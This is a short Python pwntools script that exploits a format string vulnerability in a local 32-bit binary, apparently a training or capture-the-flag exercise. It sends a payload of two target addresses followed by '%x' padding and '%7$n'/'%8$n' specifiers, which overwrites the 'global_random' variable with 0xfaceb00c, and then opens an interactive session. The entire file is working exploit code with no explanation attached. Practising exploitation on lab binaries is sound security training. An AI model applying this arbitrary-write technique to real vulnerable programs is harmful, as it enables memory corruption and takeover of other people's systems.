#!/usr/bin/env python
from pwn import *

p = process('./fs-arbt-write-32')
#(0xfaceb00c >> 16) & 0xffff
target = 0xfaceb00c
lower = target & 0xffff
higher= (target >> 16) & 0xffff
first = lower
second = higher - lower

print(hex(first))
print(hex(second))

random_value_system = p.elf.symbols['global_random']
print(hex(random_value_system))

# random_value_system = 0x804a048
value = ""
value += "\x48\xa0\x04\x08"
value += "\x4a\xa0\x04\x08"
value += "%"+ str(first-8) + "x" + "%7$n"
value += "%"+ str(second) + "x" + "%8$n"

p.sendline(value)

p.interactive()
